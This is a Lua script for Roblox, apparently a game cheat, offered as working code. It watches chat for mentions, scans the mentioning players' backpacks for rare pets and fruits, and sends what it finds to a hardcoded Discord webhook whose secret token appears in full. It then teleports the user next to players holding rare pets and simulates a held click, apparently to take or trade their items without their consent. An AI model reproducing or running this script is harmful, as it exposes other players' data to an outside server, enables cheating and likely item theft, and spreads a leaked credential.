-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Camera = workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")

-- Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

-- Improved inventory scanner with rare pet detection
local function scanInventory(player)
    local fruits = {}
    local pets = {}
    local rarePets = {}
    
    for _, item in pairs(player.Backpack:GetChildren()) do
        local name = item.Name
        
        -- Match fruits: [Disco, Wet] Blueberry [0.22kg]
        if name:match("%[.+%].+%[[%d%.]+kg%]") then
            table.insert(fruits, name)
        
        -- Match pets: Hedgehog [1.27 KG] [Age 1]
        elseif name:match(".+%[[%d%.]+ KG%]%s%[Age%s%d+%]") then
            table.insert(pets, name)
            
            -- Check for rare pets
            for _, rarePet in pairs(RARE_PETS) do
                if name:find(rarePet) then
                    table.insert(rarePets, name)
                    break
                end
            end
        end
    end
    
    return fruits, pets, rarePets
end

-- Webhook with rare pet highlighting
local function sendWebhook(player, message, fruits, pets, rarePets)
    local description = "**Message:** ```"..message.."```"
    local color = #rarePets > 0 and 0xFF0000 or 0x00FF00
    
    local fields = {
        {name = "🍇 Fruits ("..#fruits..")", value = #fruits > 0 and "```"..table.concat(fruits, "\n").."```" or "```None```", inline = true},
        {name = "🐾 Pets ("..#pets..")", value = #pets > 0 and "```"..table.concat(pets, "\n").."```" or "```None```", inline = true}
    }
    
    if #rarePets > 0 then
        table.insert(fields, 1, {
            name = "🌟 RARE PETS ("..#rarePets..")", 
            value = "```"..table.concat(rarePets, "\n").."```", 
            inline = false
        })
    end
    
    table.insert(fields, {
        name = "🔗 Profile", 
        value = "[Click here](https://www.roblox.com/users/"..player.UserId.."/profile)", 
        inline = false
    })
    
    local embed = {
        title = (#rarePets > 0 and "🚨 RARE PET ALERT! " or "📌 ")..player.Name,
        description = description,
        color = color,
        fields = fields
    }
    
    local content = #rarePets > 0 and "@everyone" or nil
    pcall(function()
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = content, embeds = {embed}})
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({content = content, embeds = {embed}}))
        end
    end)
end

-- Zoom and click optimization
local function interactWithPlayer(targetChar)
    -- Max zoom
    LocalPlayer.CameraMaxZoomDistance = 100
    LocalPlayer.CameraMinZoomDistance = 100
    LocalPlayer.CameraMode = Enum.CameraMode.Classic
    
    -- Position in front
    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        LocalPlayer.Character:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
    end
    
    -- Center screen click
    local viewport = Camera.ViewportSize
    local center = Vector2.new(viewport.X/2, viewport.Y/2)
    
    VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
    wait(2) -- Hold duration
    VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
end

-- Chat handler
local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    
    -- Mention detection
    local lowerMsg = message:lower()
    if not (lowerMsg:find("@"..LocalPlayer.Name:lower()) or
             lowerMsg:find("@everyone") or
             lowerMsg:find("@here")) then
        return
    end
    
    -- Scan inventory
    local fruits, pets, rarePets = scanInventory(player)
    
    -- Send webhook
    sendWebhook(player, message, fruits, pets, rarePets)
    
    -- Interact if they have rare pets
    if #rarePets > 0 then
        local targetChar = player.Character or player.CharacterAdded:Wait()
        interactWithPlayer(targetChar)
    end
end

-- Initialize
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
end)

print("✅ Rare Pet Scanner Active!")
